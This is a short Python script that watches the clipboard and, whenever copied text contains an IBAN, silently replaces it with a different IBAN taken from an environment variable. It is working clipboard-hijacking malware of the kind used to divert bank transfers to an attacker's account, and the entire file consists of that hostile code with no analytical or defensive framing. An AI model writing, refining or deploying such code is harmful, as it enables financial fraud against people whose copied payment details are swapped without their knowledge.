import os
import time
import pyperclip
import re
from dotenv import load_dotenv

load_dotenv()

last_clipboard_content = ""

def iban_detecter(clipboard_content):
    iban_regex = re.compile(r'[A-Z]{2}\d{2}[A-Z\d]{13,31}')
    iban_match = iban_regex.search(clipboard_content)
    if iban_match:
        return iban_match.group(0)
    else:
        return None

while True:
    clipboard_content = pyperclip.paste()
    if clipboard_content != last_clipboard_content:
        last_clipboard_content = clipboard_content
        if iban_detecter(clipboard_content):
            pyperclip.copy(os.getenv("IBAN"))
    time.sleep(1)
